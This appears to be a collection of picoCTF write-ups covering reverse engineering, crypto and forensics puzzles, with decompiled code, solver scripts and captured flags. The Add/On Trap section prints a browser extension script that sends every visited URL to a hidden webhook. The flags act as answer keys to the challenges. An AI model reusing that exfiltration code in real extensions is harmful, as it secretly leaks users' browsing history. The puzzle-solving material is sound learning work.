## Flag Hunters

> Lyrics jump from verses to the refrain kind of like a subroutine call. There's a hidden refrain this program doesn't print by default. Can you get it to print it? There might be something in it for you.

Source Code - 

```python
import re
import time


# Read in flag from file
flag = open('flag.txt', 'r').read()

secret_intro = \
'''Pico warriors rising, puzzles laid bare,
Solving each challenge with precision and flair.
With unity and skill, flags we deliver,
The ether’s ours to conquer, '''\
+ flag + '\n'


song_flag_hunters = secret_intro +\
'''

[REFRAIN]
We’re flag hunters in the ether, lighting up the grid,
No puzzle too dark, no challenge too hid.
With every exploit we trigger, every byte we decrypt,
We’re chasing that victory, and we’ll never quit.
CROWD (Singalong here!);
RETURN

[VERSE1]
Command line wizards, we’re starting it right,
Spawning shells in the terminal, hacking all night.
Scripts and searches, grep through the void,
Every keystroke, we're a cypher's envoy.
Brute force the lock or craft that regex,
Flag on the horizon, what challenge is next?

REFRAIN;

Echoes in memory, packets in trace,
Digging through the remnants to uncover with haste.
Hex and headers, carving out clues,
Resurrect the hidden, it's forensics we choose.
Disk dumps and packet dumps, follow the trail,
Buried deep in the noise, but we will prevail.

REFRAIN;

Binary sorcerers, let’s tear it apart,
Disassemble the code to reveal the dark heart.
From opcode to logic, tracing each line,
Emulate and break it, this key will be mine.
Debugging the maze, and I see through the deceit,
Patch it up right, and watch the lock release.

REFRAIN;

Ciphertext tumbling, breaking the spin,
Feistel or AES, we’re destined to win.
Frequency, padding, primes on the run,
Vigenère, RSA, cracking them for fun.
Shift the letters, matrices fall,
Decrypt that flag and hear the ether call.

REFRAIN;

SQL injection, XSS flow,
Map the backend out, let the database show.
Inspecting each cookie, fiddler in the fight,
Capturing requests, push the payload just right.
HTML's secrets, backdoors unlocked,
In the world wide labyrinth, we’re never lost.

REFRAIN;

Stack's overflowing, breaking the chain,
ROP gadget wizardry, ride it to fame.
Heap spray in silence, memory's plight,
Race the condition, crash it just right.
Shellcode ready, smashing the frame,
Control the instruction, flags call my name.

REFRAIN;

END;
'''

MAX_LINES = 100

def reader(song, startLabel):
  lip = 0
  start = 0
  refrain = 0
  refrain_return = 0
  finished = False

  # Get list of lyric lines
  song_lines = song.splitlines()
  
  # Find startLabel, refrain and refrain return
  for i in range(0, len(song_lines)):
    if song_lines[i] == startLabel:
      start = i + 1
    elif song_lines[i] == '[REFRAIN]':
      refrain = i + 1
    elif song_lines[i] == 'RETURN':
      refrain_return = i

  # Print lyrics
  line_count = 0
  lip = start
  while not finished and line_count < MAX_LINES:
    line_count += 1
    for line in song_lines[lip].split(';'):
      if line == '' and song_lines[lip] != '':
        continue
      if line == 'REFRAIN':
        song_lines[refrain_return] = 'RETURN ' + str(lip + 1)
        lip = refrain
      elif re.match(r"CROWD.*", line):
        crowd = input('Crowd: ')
        song_lines[lip] = 'Crowd: ' + crowd
        lip += 1
      elif re.match(r"RETURN [0-9]+", line):
        lip = int(line.split()[1])
      elif line == 'END':
        finished = True
      else:
        print(line, flush=True)
        time.sleep(0.5)
        lip += 1

reader(song_flag_hunters, '[VERSE1]')
```

The program starts from VERSE1, `secret_intro` includes our flag. 

Flag - 

```
Crowd: hi;RETURN 0;

picoCTF{70637h3r_f0r3v3r_befbccb7}
```

## Transformation

> I wonder what this really is...
> [enc](https://challenge-files.picoctf.net/c_wily_courier/acd4ffc228784496e0a2c6445bba7646a457dcf13d9faca2f390c0d6259c25cb/enc) ''.join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])

Flag - 

```python

mix = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}0123456789_"

flag = ""

with open('enc', 'r') as f:
	data = (f.read())
	for i in range(len(data)):
		match = (ord(data[i]))

		for first in mix:
			print('first', first)
			for second in mix:
				print('second', second)
				if ((ord(first) << 8) + ord(second)) == match:
					print('first', first, 'and second', second)
					flag += first+second
					break
			else:
				continue
			break
print(flag)


# mix = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}0123456789_"

# flag = ""

# with open('enc', 'r') as f:
#     data = (f.read())
#     for i in range(len(data)):
#         match = (ord(data[i]))
#         found = False  # Flag to track if match was found

#         for first in mix:
#             if found:  # Skip if already found
#                 break
#             print('first', first)
#             for second in mix:
#                 print('second', second)
#                 if ((ord(first) << 8) + ord(second)) == match:
#                     print('first', first, 'and second', second)
#                     flag += first+second
#                     found = True  # Set flag
#                     break  # Break inner loop

# print(flag)

```

```
picoCTF{16_bits_inst34d_of_8_b7f62ca5}
```

## vault-door-training

> Your mission is to enter Dr. Evil's laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault's computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility.

Source Code - 

```java
import java.util.*;

class VaultDoorTraining {
    public static void main(String args[]) {
        VaultDoorTraining vaultDoor = new VaultDoorTraining();
        Scanner scanner = new Scanner(System.in); 
        System.out.print("Enter vault password: ");
        String userInput = scanner.next();
	String input = userInput.substring("picoCTF{".length(),userInput.length()-1);
	if (vaultDoor.checkPassword(input)) {
	    System.out.println("Access granted.");
	} else {
	    System.out.println("Access denied!");
	}
   }

    // The password is below. Is it safe to put the password in the source code?
    // What if somebody stole our source code? Then they would know what our
    // password is. Hmm... I will think of some ways to improve the security
    // on the other doors.
    //
    // -Minion #9567
    public boolean checkPassword(String password) {
        return password.equals("w4rm1ng_Up_w1tH_jAv4_000wYdiGTvt");
    }
}
```

Flag - 

```
picoCTF{w4rm1ng_Up_w1tH_jAv4_000wYdiGTvt}
```

## Secure Password Database

> I made a new password authentication program that even shows you the password you entered saved in the database! Isn't that cool? [system.out](https://challenge-files.picoctf.net/c_candy_mountain/4724bf8a88a0b49eea63b1458e128d84e7f1322a8327751b9608fa059f53fbd1/system.out)

Used `ghidra` to analyse the program - 


```c
    local_f8 = make_secret(local_e5);
    if (local_f8 == local_100) {
      local_f0 = fopen("flag.txt","r");
```

```c
void make_secret(long param_1)

{
  long local_10;
  
  for (local_10 = 0; obf_bytes[local_10] != '\0'; local_10 = local_10 + 1) {
    *(byte *)(local_10 + param_1) = obf_bytes[local_10] ^ 0xaa;
  }
  *(undefined1 *)(param_1 + 0xc) = 0;
  hash(param_1);
  return;
}
```

```c
long hash(byte *param_1)

{
  byte *local_20;
  long local_10;
  
  local_10 = 0x1505;
  local_20 = param_1;
  while( true ) {
    if (*local_20 == 0) break;
    local_10 = (long)(int)(uint)*local_20 + local_10 * 0x21;
    local_20 = local_20 + 1;
  }
  return local_10;
}
```

Used `gdb` to set a break point and reveals the hash - 

```
gdb ./system.out

break hash

run

finish

info reg
```

```
rax            0xd3770d6251b31be2  -3209081493549540382
```

Flag - 

```shell
$ nc candy-mountain.picoctf.net 57639

Please set a password for your account:
abcd
How many bytes in length is your password?
4
You entered: 4
Your successfully stored password:
97 98 99 100 10 
Enter your hash to access your account!
-3209081493549540382
picoCTF{d0nt_trust_us3rs}
```

## Bypass Me

> Your task is to analyze and exploit a password-protected binary called **bypassme.bin** and binary performs input sanitization.
> However, instead of guessing the password, you are expected to reverse engineer or debug the program to bypass the authentication logic and retrieve the hidden flag.
> You'll need to think like an attacker using tool like [LLDB](https://lldb.llvm.org/use/tutorial.html) to uncover how the binary works under the hood and leak the correct password.

Used `scp` to transfer the file - 

```shell
scp -P 60286 ctf-player@foggy-cliff.picoctf.net:bypassme.bin .
```

File info - 

```shell
$ file bypassme.bin 

bypassme.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b8ad33d01afb381f4e12fa6e6353f7eaec4af3a2, for GNU/Linux 3.2.0, with debug_info, not stripped
```

Used `ghdira` and found the `decode_password` function - 

```c

void decode_password(char *out)

{
  long lVar1;
  long in_FS_OFFSET;
  char *out_local;
  int i;
  uchar enc [11];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  enc[0] = 0xf9;
  enc[1] = 0xdf;
  enc[2] = 0xda;
  enc[3] = 0xcf;
  enc[4] = 0xd8;
  enc[5] = 0xf9;
  enc[6] = 0xcf;
  enc[7] = 0xc9;
  enc[8] = 0xdf;
  enc[9] = 0xd8;
  enc[10] = 0xcf;
  for (i = 0; (uint)i < 0xb; i = i + 1) {
    out[i] = enc[i] ^ 0xaa;
  }
  out[0xb] = '\0';
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Used this script to decode/reverse the logic - 

```python

enc = [0xf9, 0xdf, 0xda, 0xcf, 0xd8, 0xf9, 0xcf, 0xc9, 0xdf, 0xd8, 0xcf]

for each in enc:
    print(chr(each ^ 0xaa), end='')
```

Output - `SuperSecure`

Flag - 

```shell
ctf-player@pico-chall$ ./bypassme.bin 

 Initializing secure modules...
 Running memory diagnostics...
 All systems online...

 Access to this terminal is restricted.
 Please authenticate below.
----------------------------------------


[3 tries left] Enter password: SuperSecure

Raw Input:      [SuperSecure]
Sanitized Input:[SuperSecure]
Hint: Input must match something special...

Authenticating...
🎉 Flag: picoCTF{d3bugg3r_p0w3r_is_4w3s0m3_d39cc0db}

```

## Autorev 1

> You think you can reverse engineer? Let's test out your speed

```shell
$ nc mysterious-sea.picoctf.net 57462
```

Output - 

```
Line 1 - Welcome! I think I'm pretty good at reverse enginnering. There's NO WAY anyone's better than me. Wanna try? I have 20 binaries I'm going to send you and you have 1 second EACH to get the secret in each one. Good luck >:)

Line 2 - 849631030

Line 3 - Here's the next binary in bytes:

Line 4 - 7f454c4602010.................

Line 5 - What's the secret?:
```

Extract the data - 

```shell
$ nc mysterious-sea.picoctf.net 57462 | head -n 4 | tail -n -1 | xxd -r -p > raw

$ file raw

raw: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c2d0bd6a2729e38af0e78d0de178a8b65112a43a, for GNU/Linux 3.2.0, not stripped

```

Analyzed the file in `ghidra` - 

`main` - 

```c

undefined8 main(void)

{
  int local_10;
  int local_c;
  
  local_c = -0xbf89b60;
  local_10 = 0;
  puts("What\'s the secret?");
  __isoc99_scanf(&DAT_00402023,&local_10);
  if (local_c == local_10) {
    puts("Correct!");
  }
  else {
    puts("Nice try :(");
  }
  return 0;
}
```

```
        0040113e c7 45 fc        MOV        dword ptr [RBP + local_c],0xf40764a0
                 a0 64 07 f4
        00401145 c7 45 f8        MOV        dword ptr [RBP + local_10],0x0
                 00 00 00 00

```

`-0xbf89b60` and `0xf40764a0` are same , just different representation...

```python
$ python3 -c "print(0xf40764a0 & 0xffffffff)"
4094125216

$ python3 -c "print(-0xbf89b60 & 0xffffffff)"
4094125216

```

`c7 45 fc` and `c7 45 f8` are fixed ....

Solution - 

```python
from pwn import *
import re

r = remote('mysterious-sea.picoctf.net', 57462)

for _ in range(20):
	print(r.recvline())
	r.recvline()
	r.recvline()
	raw = (r.recvline())
	r.recv()

	hex_str = re.findall(b'c745fc(.*)c745f8', raw)
	reversed_bytes = bytes.fromhex(hex_str[0].decode())[::-1]

	decimal = int.from_bytes(reversed_bytes, 'big')
	print('sending' , decimal)
	r.sendline(str(decimal).encode())


print(r.recvall())

```

Flag -

```
picoCTF{4u7o_r3v_g0_brrr_78c345aa}
```

## Hidden Cipher 2

> The flag is right in front of you... kind of. You just need to solve a basic math problem to see it. But to get the real flag, you’ll have to understand how that math answer is used.
> You can download the program files [here](https://challenge-files.picoctf.net/c_crystal_peak/e9d9230c69d1e8a6465f59b69c8d1df0c22c64aae10c66be67a04a260ad457ba/hiddencipher2.zip).

Got two files `flag.txt` and `hiddencipher2`.

```shell
$ file hiddencipher2 

hiddencipher2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=599eedd164a0821201befcb967a2529efa0cc3ce, for GNU/Linux 3.2.0, not stripped

```

```shell
$ nc crystal-peak.picoctf.net 49299

What is 2 + 0? 2
Encoded flag values:
224, 210, 198, 222, 134, 168, 140, 246, 218, 104, 232, 208, 190, 196, 102, 208, 98, 220, 200, 190, 198, 98, 224, 208, 102, 228, 190, 204, 114, 100, 204, 112, 96, 102, 202, 250
```

from`ghidra` - 

```c

void encode_flag(long param_1,int param_2)

{
  int local_c;
  
  puts("Encoded flag values:");
  for (local_c = 0; *(char *)(param_1 + local_c) != '\0'; local_c = local_c + 1) {
    printf("%d",(ulong)(uint)(*(char *)(param_1 + local_c) * param_2));
    if (*(char *)(param_1 + (long)local_c + 1) != '\0') {
      printf(", ");
    }
  }
  putchar(10);
  return;
}
```

Logic - 

```
Encoded = Math Question Result * ord(flag)
```

Decoded flag - 

```python

data = [224, 210, 198, 222, 134, 168, 140, 246, 218, 104, 232, 208, 190, 196, 102, 208, 98, 220, 200, 190, 198, 98, 224, 208, 102, 228, 190, 204, 114, 100, 204, 112, 96, 102, 202, 250
]

for each in data:
	print(chr(each//2), end='')
```

Flag - 

```
picoCTF{m4th_b3h1nd_c1ph3r_f92f803e}
```

## Hidden Cipher 1

> The flag is right in front of you; just slightly encrypted. All you have to do is figure out the cipher and the key. 
> You can download the program files [here](https://challenge-files.picoctf.net/c_candy_mountain/adf6041d4a058205949589da090247145daf6e882fbe6b13daad6044ff6fcabc/hiddencipher.zip)

Encrypted flag - 

```shell

$ nc candy-mountain.picoctf.net 51005

Here your encrypted flag:
235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d57426752731306472e

```

File info - 

```shell
$ file hiddencipher
hiddencipher: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), statically linked, no section header

$ strings hiddencipher
UPX!
v@P7hw
p/lib64
nux-x866
.so.2_
...
```

UPX is a packer that compresses an executable to make it smaller. It also acts as a layer of “obfuscation” because the real code is compressed. When you run the program, it decompresses itself in memory first. To see the actual code for analysis, we have to unpack it.

```shell
$ upx -d hiddencipher
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.4       Markus Oberhumer, Laszlo Molnar & John Reiser    May 9th 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     24275 <-      7196   29.64%   linux/amd64   hiddencipher

Unpacked 1 file.

$ file hiddencipher

hiddencipher: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=488b130ed5a77d07664a19f62b8af4f2b327e270, for GNU/Linux 3.2.0, not stripped

```

Source - 

```c

undefined8 main(void)

{
  FILE *__stream;
  undefined8 uVar1;
  size_t __n;
  void *__ptr;
  long lVar2;
  int local_2c;
  
  __stream = fopen("flag.txt","rb");
  if (__stream == (FILE *)0x0) {
    perror("[!] Failed to open flag.txt");
    uVar1 = 1;
  }
  else {
    fseek(__stream,0,2);
    __n = ftell(__stream);
    rewind(__stream);
    __ptr = malloc(__n + 1);
    if (__ptr == (void *)0x0) {
      puts("[!] Memory allocation error.");
      fclose(__stream);
      uVar1 = 1;
    }
    else {
      fread(__ptr,1,__n,__stream);
      fclose(__stream);
      *(undefined1 *)((long)__ptr + __n) = 0;
      lVar2 = get_secret();
      puts("Here your encrypted flag:");
      for (local_2c = 0; (long)local_2c < (long)__n; local_2c = local_2c + 1) {
        printf("%02x",(ulong)(*(byte *)(lVar2 + local_2c % 6) ^
                             *(byte *)((long)__ptr + (long)local_2c)));
      }
      putchar(10);
      free(__ptr);
      uVar1 = 0;
    }
  }
  return uVar1;
}

```

Clue  - 
```c
      for (local_2c = 0; (long)local_2c < (long)__n; local_2c = local_2c + 1) {
        printf("%02x",(ulong)(*(byte *)(lVar2 + local_2c % 6) ^
                             *(byte *)((long)__ptr + (long)local_2c)));
```

What it does:
1. **Loop** from `0` to `__n - 1`
2. **Key byte**: `*(byte *)(lVar2 + local_2c % 6)`
    - Takes a byte from the key
    - Uses `% 6` so the key repeats every 6 bytes
3. **Data byte**: `*(byte *)((long)__ptr + (long)local_2c)`
    - Takes one byte from the input data
4. **XOR**: `key_byte ^ data_byte`
5. **Print**: `printf("%02x", ...)` outputs as 2-digit hex

`get_secret` - 

```c

undefined7 * get_secret(void)

{
  s.0._0_1_ = 0x53;
  s.0._1_1_ = 0x33;
  s.0._2_1_ = 0x43;
  s.0._3_1_ = 0x72;
  s.0._4_1_ = 0x33;
  s.0._5_1_ = 0x74;
  s.0._6_1_ = 0;
  return &s.0;
}
```

key - `S3Cr3t`

Decoded - 

```python
raw = "235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d57426752731306472e"
key = b"S3Cr3t"


encrypted = bytes.fromhex(raw)

# Decrypt by XORing with repeating key
decrypted = bytearray()
for i, byte in enumerate(encrypted):
    decrypted.append(byte ^ key[i % len(key)])


# OR
# decrypted = bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])

# Print result
print(decrypted.decode('utf-8', errors='ignore'))
```

Flag -

```
picoCTF{xor_unpack_4nalys1s_d64a0a53}
```

## Gatekeeper

> What’s behind the numeric gate? You only get access if you enter the _right_ kind of number.
>  You can download the program file [here](https://challenge-files.picoctf.net/c_green_hill/3fbaf24064af8ad31d72b491e37d651b08c71d99a218aea15724e19192eecb97/gatekeeper)

File info - 

```shell
$ file gatekeeper 

gatekeeper: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f8be7d9d53fcf8763ed4b76fe8c98b23609085db, for GNU/Linux 3.2.0, not stripped

```

Test - 

```shell
$ nc green-hill.picoctf.net 59573

Enter a numeric code (must be > 999 ): 1500
Access Denied.

```

Analyse - 

`main` - 

```c

undefined8 main(void)

{
  int iVar1;
  size_t sVar2;
  long lVar3;
  undefined8 uVar4;
  long in_FS_OFFSET;
  int local_40;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter a numeric code (must be > 999 ): ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00102070,local_38);
  sVar2 = strlen(local_38);
  iVar1 = is_valid_decimal(local_38);
  if (iVar1 == 0) {
    iVar1 = is_valid_hex(local_38);
    if (iVar1 == 0) {
      puts("Invalid input.");
      uVar4 = 1;
      goto LAB_00101698;
    }
    lVar3 = strtol(local_38,(char **)0x0,0x10);
    local_40 = (int)lVar3;
  }
  else {
    local_40 = atoi(local_38);
  }
  if (local_40 < 1000) {
    puts("Too small.");
  }
  else if (local_40 < 10000) {
    if ((int)sVar2 == 3) {
      reveal_flag();
    }
    else {
      puts("Access Denied.");
    }
  }
  else {
    puts("Too high.");
  }
  uVar4 = 0;
LAB_00101698:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar4;
}
```

The conditions - 
- Must be 3 in length
- Must be greater than 1000

From the below logic - we can also enter hex e.g. `fff` which is 3 characters long and 4095 in decimal.

```c
if (iVar1 == 0) {
    iVar1 = is_valid_hex(local_38);
    if (iVar1 == 0) {
      puts("Invalid input.");
      uVar4 = 1;
      goto LAB_00101698;
    }
    lVar3 = strtol(local_38,(char **)0x0,0x10);
    local_40 = (int)lVar3;
  }
```

```shell
$ nc green-hill.picoctf.net 62945

Enter a numeric code (must be > 999 ): fff
Access granted: }e16ftc_oc_ipfff5ftc_oc_ipe_99ftc_oc_ip9_TGftc_oc_ip_xehftc_oc_ip_tigftc_oc_ipid_3ftc_oc_ip{FTCftc_oc_ipocipftc_oc_ip
```

This is a **reverse printing loop** that outputs characters backwards with a sneaky string injected every 4 bytes i.e. `ftc_oc_ip`.

The logic - 

```c

void reveal_flag(void)

{
  FILE *__stream;
  size_t __n;
  void *__ptr;
  uint local_24;
  
  __stream = fopen("/flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Flag file not found.");
  }
  else {
    fseek(__stream,0,2);
    __n = ftell(__stream);
    rewind(__stream);
    __ptr = malloc(__n + 1);
    if (__ptr != (void *)0x0) {
      fread(__ptr,1,__n,__stream);
      *(undefined1 *)((long)__ptr + __n) = 0;
      fclose(__stream);
      printf("Access granted: ");
      local_24 = (uint)__n;
      while (local_24 = local_24 - 1, -1 < (int)local_24) {
        putchar((int)*(char *)((long)__ptr + (long)(int)local_24));
        if ((local_24 & 3) == 0) {
          printf("ftc_oc_ip");
        }
      }
      putchar(10);
      free(__ptr);
    }
  }
  return;
}
```

Removed the `ftc_oc_ip` and reverse the string - 

```shell
$ echo "}e16ftc_oc_ipfff5ftc_oc_ipe_99ftc_oc_ip9_TGftc_oc_ip_xehftc_oc_ip_tigftc_oc_ipid_3ftc_oc_ip{FTCftc_oc_ipocipftc_oc_ip" | sed 's/ftc_oc_ip//g' | rev

picoCTF{3_digit_hex_GT_999_e5fff61e}
```

## Silent Stream

> We recovered a suspicious packet capture file that seems to contain a transferred file. The sender was kind enough to also share the script they used to encode and send it. Can you reconstruct the original file?
> Download the PCAP file: [here](https://challenge-files.picoctf.net/c_plain_mesa/7558bdaf3e394196ea8e355b04184be45dd0523e4ee0a0ca511252ef41cc4868/packets.pcap) . And the sender's encoding [script](https://challenge-files.picoctf.net/c_plain_mesa/7558bdaf3e394196ea8e355b04184be45dd0523e4ee0a0ca511252ef41cc4868/encrypt.py)

`encrypt.py` - 

```python
import socket

def encode_byte(b, key):

    return (b + key) % 256

def simulate_flag_transfer(filename, key=42):
    print(f"[!] flag transfer for '{filename}' using encoding key = {key}")

    with open(filename, "rb") as f:
        data = f.read()

    print(f"[+] Encoding and sending {len(data)} bytes...")

    for b in data:
        encoded = encode_byte(b, key)
        pass

    print("Transfer complete")

if __name__ == "__main__":
    simulate_flag_transfer("flag.txt") 

```

Opened the pcap file inside wireshark and from TCP stream saved the data as raw hex.

```python
key = 42
data = open('raw.hex', 'rb').read()

decoded = bytes([(b - key) % 256 for b in data])


with open('decoded.jpg', 'wb') as f:
    f.write(decoded)

```

Flag - 

```
picoCTF{tr4ck_th3_tr4ff1c_f4659ffd}
```

## The Add/On Trap

> What kind of information can an Add/On reach? Is it possible to exfiltrate them without me noticing? Do they really do what they say? Most importantly, when to eat? These and many other questions Add/On users should be asking themselves.
> Download the provided browser extension and inspect it to uncover the hidden flag:
> - [Download the .xpi](https://challenge-files.picoctf.net/c_plain_mesa/446f7050d4aa8ec29b220a15635840f2506f50ee38e8bde969d4a44e80128881/suspicious.zip) , password `picoctf`

unzipped the file - Firefox browser extension.

Clue - 

`background/main.js` - 

```js
// Secret key must be 32 url-safe base64-encoded bytes!
// TODO I must find a solution to remove the key from here, for now I'll leave it there because I need it to encrypt the webhook

function logOnCompleted(details) {
    console.log(`Information to exfiltrate: ${details.url}`);
    const key="cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0="
    const webhookUrl='gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'
    const payload = {
        content: `${details.url}`
    };
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.status != 204) {
            throw `Unable to complete the extraction!`;
        }
        return response;
    });
}

browser.webNavigation.onCompleted.addListener(logOnCompleted);

```

Base64 decoded key - 

```shell
$ echo "cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=" | base64 -d

picoCTF{you're on the right tra}
```

`webhookUrl` is encrypted - `gAAAAAB` encryption refers to a specific format of symmetric encryption using the Fernet encryption method, which ensures that a message encrypted with it cannot be manipulated or read without the correct key.

Decryption - 

```python
from cryptography.fernet import Fernet

key = "cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0="

data = "gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE"

f = Fernet(key)

print(f.decrypt(data))
```

Flag - 

```
picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}
```

Ref:
- https://cryptography.io/en/latest/fernet/

## Pico Bank

> In a bustling city where innovation meets finance, Pico Bank has emerged as a beacon of cutting-edge security. Promising state-of-the-art protection for your assets, the bank claims its mobile application is impervious to all forms of cyber threats. Pico Bank’s tagline, "Security Beyond the Limits," echoes through its high-tech marketing campaigns, assuring users of their utmost safety.
> 
> As a cybersecurity enthusiast, your mission is to test these bold claims. You’ve been hired by a secretive organization to put Pico Bank’s mobile app through a rigorous security assessment. The flag might be in one or more locations, and additional information reveals that a Pico Bank user’s credentials were leaked in an unusual way. Your task is to crack the username and password based on the following profile information: His name is Alex Johnson with the email [johnson@picobank.com](mailto:johnson@picobank.com), Date of Birth: March 14, 1990, Last Transaction Amount: $345.67, Pet name: tricky, and Favorite Color: Blue.
> 
> To perform this challenge, you can use any Android emulator. Some examples include [Genymotion Android Emulator](https://www.genymotion.com/product-desktop/download/) or [Android Studio](https://developer.android.com/studio).

Tools Used - 
- apktool
- android studio

`Login.smali` - 

```
    .line 42
    .local v1, "password":Ljava/lang/String;
    const-string v2, "johnson"

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_40

    const-string v2, "tricky1990"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_40
```

We can get the hardcoded username and password -
- username : johnson - password : tricky1990

Used apktool to decompile the apk file and inside `/res/values/strings.xml` we can get the `otp` - 

```
<string name="otp_value">9673</string>
```

After successful login we got two clues -
- Have you analyzed the server's response when handling otp requests.
- Investigate the transaction history for unusual data.

Clue from `OTP.smali` - 

```
POST request to this endpoint - /verify-otp
```

```shell
$ curl -X POST http://amiable-citadel.picoctf.net:58477/verify-otp -H "Content-Type: application/json" -d '{"otp":"9673"}'

{"success":true,"message":"OTP verified successfully","flag":"s3cur3d_m0b1l3_l0g1n_976ea739}","hint":"The other part of the flag is hidden in the app"}

```

The second clue is the transaction history. 

```
1110000
1101001
1100011
1101111
1000011
1010100
1000110
1111011
110001
1011111
1101100
110001
110011
1100100
1011111
110100
1100010
110000
1110101
1110100
1011111
1100010
110011
110001
1101110
1100111
1011111
```

Decoded - 

```python
with open('transactions', 'r') as f:
	data = f.readlines()
	for each in data:
		print(chr(int(each, 2)), end='')
```

Flag - 

```
picoCTF{1_l13d_4b0ut_b31ng_s3cur3d_m0b1l3_l0g1n_976ea739}
```

